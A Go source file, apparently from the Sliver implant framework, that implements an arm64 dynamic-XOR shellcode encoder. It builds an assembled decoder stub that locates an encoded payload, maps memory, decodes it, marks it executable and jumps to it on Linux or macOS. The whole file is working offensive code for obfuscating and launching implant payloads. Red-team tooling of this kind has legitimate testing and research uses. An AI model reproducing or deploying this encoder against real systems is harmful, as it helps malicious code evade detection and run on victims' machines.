package arm64

/*
	Sliver Implant Framework
	Copyright (C) 2026  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"strings"

	"github.com/moloch--/go-keystone"
)

// xorDynamicBadchars are used when generating/selecting terminators and keys.
// Note: unlike the amd64 Metasploit xor_dynamic implementation, the arm64
// decoder stub is not guaranteed to be badchar-free.
var xorDynamicBadchars = map[byte]bool{
	0x00: true,
	0x0a: true,
	0x0d: true,
}

// XorDynamic encodes an arm64 payload using a dynamic XOR scheme with:
//
//	stub + key + keyTerm + encodedPayload + payloadTerm
//
// If key includes a trailing key terminator + payload terminator (3 bytes) that satisfy the
// encoder constraints, those are used verbatim.
//
// Note: For large/high-entropy payloads, a 2-byte payload terminator may not exist. In
// that case, this implementation falls back to a 4-byte payload terminator.
func XorDynamic(data []byte, key []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("xor_dynamic encoder: empty payload")
	}
	if len(key) == 0 {
		return nil, fmt.Errorf("xor_dynamic encoder: empty key")
	}

	coreKey := key
	var keyTerm byte
	var payloadTerm []byte

	encoded := xorDynamicEncode(data, key)
	explicit := false

	if candidateKey, candidateKeyTerm, candidatePayloadTerm, ok := splitExplicitTerms(data, key); ok {
		coreKey = candidateKey
		keyTerm = candidateKeyTerm
		payloadTerm = candidatePayloadTerm
		encoded = xorDynamicEncode(data, coreKey)
		explicit = true
	}

	if containsBadchars(coreKey, xorDynamicBadchars) {
		return nil, fmt.Errorf("xor_dynamic encoder: key contains badchars")
	}

	if !explicit {
		var err error
		keyTerm, err = selectKeyTerm(coreKey)
		if err != nil {
			return nil, err
		}
		payloadTerm, err = selectPayloadTerm(encoded)
		if err != nil {
			return nil, err
		}
	} else {
		if bytes.IndexByte(coreKey, keyTerm) != -1 {
			return nil, fmt.Errorf("xor_dynamic encoder: key contains key terminator")
		}
		if bytes.Contains(encoded, payloadTerm) {
			return nil, fmt.Errorf("xor_dynamic encoder: encoded payload contains payload terminator")
		}
	}

	stub, err := buildXorDynamicStub(keyTerm, payloadTerm)
	if err != nil {
		return nil, err
	}

	final := make([]byte, 0, len(stub)+len(coreKey)+1+len(encoded)+len(payloadTerm))
	final = append(final, stub...)
	final = append(final, coreKey...)
	final = append(final, keyTerm)
	final = append(final, encoded...)
	final = append(final, payloadTerm...)

	return final, nil
}

func xorDynamicEncode(data []byte, key []byte) []byte {
	encoded := make([]byte, len(data))
	for i := range data {
		encoded[i] = data[i] ^ key[i%len(key)]
	}
	return encoded
}

func splitExplicitTerms(data []byte, key []byte) ([]byte, byte, []byte, bool) {
	if len(key) < 4 {
		return nil, 0, nil, false
	}

	candidateKey := key[:len(key)-3]
	if len(candidateKey) == 0 {
		return nil, 0, nil, false
	}

	keyTerm := key[len(key)-3]
	payloadTerm := key[len(key)-2:]

	if xorDynamicBadchars[keyTerm] || xorDynamicBadchars[payloadTerm[0]] || xorDynamicBadchars[payloadTerm[1]] {
		return nil, 0, nil, false
	}

	if bytes.IndexByte(candidateKey, keyTerm) != -1 {
		return nil, 0, nil, false
	}

	if containsBadchars(candidateKey, xorDynamicBadchars) {
		return nil, 0, nil, false
	}

	encoded := xorDynamicEncode(data, candidateKey)
	if bytes.Contains(encoded, payloadTerm) {
		return nil, 0, nil, false
	}

	return candidateKey, keyTerm, append([]byte{}, payloadTerm...), true
}

func selectKeyTerm(key []byte) (byte, error) {
	for _, b := range allowedDynamicChars() {
		if bytes.IndexByte(key, b) == -1 {
			return b, nil
		}
	}
	return 0, fmt.Errorf("xor_dynamic encoder: key terminator not found")
}

func selectPayloadTerm(encoded []byte) ([]byte, error) {
	allowed := allowedDynamicChars()

	// Fast path: try to find a distinct 2-byte terminator not present in the
	// encoded payload.
	present := make([]bool, 1<<16)
	for i := 0; i+1 < len(encoded); i++ {
		present[int(encoded[i])<<8|int(encoded[i+1])] = true
	}
	for _, first := range allowed {
		for _, second := range allowed {
			if first == second {
				continue // avoid periodic terminators (reduces cross-boundary false matches)
			}
			if !present[int(first)<<8|int(second)] {
				return []byte{first, second}, nil
			}
		}
	}

	// Fallback: for large/high-entropy payloads it is possible for every allowed
	// 2-byte sequence to occur. In that case, pick a 4-byte terminator (distinct
	// bytes) which is overwhelmingly likely to be absent.
	for attempts := 0; attempts < 2048; attempts++ {
		term, err := randomDistinctBytes(allowed, 4)
		if err != nil {
			return nil, err
		}
		if !bytes.Contains(encoded, term) {
			return term, nil
		}
	}
	return nil, fmt.Errorf("xor_dynamic encoder: payload terminator not found")
}

func allowedDynamicChars() []byte {
	allowed := make([]byte, 0, 255)
	for i := 1; i <= 255; i++ {
		b := byte(i)
		if xorDynamicBadchars[b] {
			continue
		}
		allowed = append(allowed, b)
	}
	return allowed
}

func randomDistinctBytes(allowed []byte, n int) ([]byte, error) {
	if n <= 0 {
		return nil, fmt.Errorf("xor_dynamic encoder: invalid terminator length %d", n)
	}
	if len(allowed) < n {
		return nil, fmt.Errorf("xor_dynamic encoder: not enough allowed bytes (%d) for %d-byte terminator", len(allowed), n)
	}

	term := make([]byte, 0, n)
	var seen [256]bool
	var r [1]byte
	for len(term) < n {
		if _, err := rand.Read(r[:]); err != nil {
			return nil, err
		}
		b := allowed[int(r[0])%len(allowed)]
		if seen[b] {
			continue
		}
		seen[b] = true
		term = append(term, b)
	}
	return term, nil
}

func buildXorDynamicStub(keyTerm byte, payloadTerm []byte) ([]byte, error) {
	if len(payloadTerm) != 2 && len(payloadTerm) != 4 {
		return nil, fmt.Errorf("xor_dynamic encoder: payload terminator must be 2 or 4 bytes")
	}

	engine, err := keystone.NewEngine(keystone.ARCH_ARM64, keystone.MODE_LITTLE_ENDIAN)
	if err != nil {
		return nil, err
	}
	defer func() { _ = engine.Close() }()

	var payloadLoad string
	var payloadVal uint64
	switch len(payloadTerm) {
	case 2:
		payloadLoad = "ldrh w7, [x9]"
		payloadVal = uint64(binary.LittleEndian.Uint16(payloadTerm))
	case 4:
		payloadLoad = "ldr w7, [x9]"
		payloadVal = uint64(binary.LittleEndian.Uint32(payloadTerm))
	default:
		return nil, fmt.Errorf("xor_dynamic encoder: invalid payload terminator length %d", len(payloadTerm))
	}

	src := strings.Join([]string{
		"adr x19, payload",  // x19 = key start
		"mov x1, x19",       // x1 = scan pointer
		"find_key_term:",    //
		"ldrb w2, [x1], #1", // read key byte
		fmt.Sprintf("cmp w2, #0x%02X", keyTerm),
		"b.ne find_key_term", // keep scanning
		"mov x20, x1",        // x20 = payload start / jump target
		"mov x3, x1",         // x3 = payload decode pointer
		"mov x4, x19",        // x4 = key decode pointer
		fmt.Sprintf("movz x10, #0x%X", uint16(payloadVal&0xffff)),
		fmt.Sprintf("movk x10, #0x%X, lsl #16", uint16((payloadVal>>16)&0xffff)),
		fmt.Sprintf("movk x10, #0x%X, lsl #32", uint16((payloadVal>>32)&0xffff)),
		fmt.Sprintf("movk x10, #0x%X, lsl #48", uint16((payloadVal>>48)&0xffff)),

		// Scan for the payload terminator (it is guaranteed not to occur in the
		// encoded payload), then allocate a RW buffer, decode into it, mprotect
		// to RX, and jump.
		"mov x9, x3", // x9 = scan pointer
		"find_payload_term:",
		payloadLoad,
		"cmp w7, w10",
		"b.eq payload_term_found",
		"add x9, x9, #1",
		"b find_payload_term",
		"payload_term_found:",
		"sub x22, x9, x20", // x22 = payload len in bytes (terminator excluded)

		// mmap(NULL, payloadLen, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0)
		"mov x0, #0",
		"mov x1, x22",
		"mov x2, #3",      // PROT_READ|PROT_WRITE
		"mov x3, #0x1002", // MAP_PRIVATE|MAP_ANON (darwin)
		"mov x4, #-1",
		"mov x5, #0",
		"mov x8, #222", // Linux: __NR_mmap
		fmt.Sprintf("movz x16, #0x%X", uint16(0x020000C5&0xffff)),
		fmt.Sprintf("movk x16, #0x%X, lsl #16", uint16((0x020000C5>>16)&0xffff)),
		fmt.Sprintf("movk x16, #0x%X, lsl #32", uint16((0x020000C5>>32)&0xffff)),
		fmt.Sprintf("movk x16, #0x%X, lsl #48", uint16((0x020000C5>>48)&0xffff)),
		"svc #0",
		// Darwin MAP_ANON is 0x1000, Linux MAP_ANONYMOUS is 0x20.
		// Try Darwin flags first, then retry with Linux flags if the syscall fails.
		"tbnz x0, #63, mmap_linux",
		"b mmap_ok",
		"mmap_linux:",
		"mov x0, #0",
		"mov x1, x22",
		"mov x2, #3",    // PROT_READ|PROT_WRITE
		"mov x3, #0x22", // MAP_PRIVATE|MAP_ANONYMOUS (linux)
		"mov x4, #-1",
		"mov x5, #0",
		"mov x8, #222", // Linux: __NR_mmap
		fmt.Sprintf("movz x16, #0x%X", uint16(0x020000C5&0xffff)),
		fmt.Sprintf("movk x16, #0x%X, lsl #16", uint16((0x020000C5>>16)&0xffff)),
		fmt.Sprintf("movk x16, #0x%X, lsl #32", uint16((0x020000C5>>32)&0xffff)),
		fmt.Sprintf("movk x16, #0x%X, lsl #48", uint16((0x020000C5>>48)&0xffff)),
		"svc #0",
		"mmap_ok:",
		"mov x23, x0", // x23 = dest base
		"mov x24, x0", // x24 = dest ptr
		"mov x3, x20", // restore src pointer (payload start)
		"mov x4, x19", // restore key pointer

		"decode_loop:",
		"cmp x3, x9", // reached terminator?
		"b.eq decode_done",

		"ldrb w5, [x4], #1", // load key byte
		fmt.Sprintf("cmp w5, #0x%02X", keyTerm),
		"b.ne have_key",
		"mov x4, x19",       // reset key pointer
		"ldrb w5, [x4], #1", // load first key byte
		"have_key:",
		"ldrb w6, [x3], #1", // load payload byte + advance
		"eor w6, w6, w5",
		"strb w6, [x24], #1", // store + advance dest
		"b decode_loop",

		"decode_done:",
		// mprotect(dst, payloadLen, PROT_READ|PROT_EXEC)
		"mov x0, x23",
		"mov x1, x22",
		"mov x2, #5",   // PROT_READ|PROT_EXEC
		"mov x8, #226", // Linux: __NR_mprotect
		fmt.Sprintf("movz x16, #0x%X", uint16(0x0200004A&0xffff)),
		fmt.Sprintf("movk x16, #0x%X, lsl #16", uint16((0x0200004A>>16)&0xffff)),
		fmt.Sprintf("movk x16, #0x%X, lsl #32", uint16((0x0200004A>>32)&0xffff)),
		fmt.Sprintf("movk x16, #0x%X, lsl #48", uint16((0x0200004A>>48)&0xffff)),
		"svc #0",
		"br x23", // jump to decoded payload
		"payload:",
	}, "\n")

	inst, err := engine.Assemble(src, 0)
	if err != nil {
		return nil, err
	}
	if len(inst) == 0 || len(inst)%4 != 0 {
		return nil, fmt.Errorf("xor_dynamic encoder: unexpected stub length %d", len(inst))
	}
	return inst, nil
}

func containsBadchars(data []byte, badchars map[byte]bool) bool {
	for _, b := range data {
		if badchars[b] {
			return true
		}
	}
	return false
}
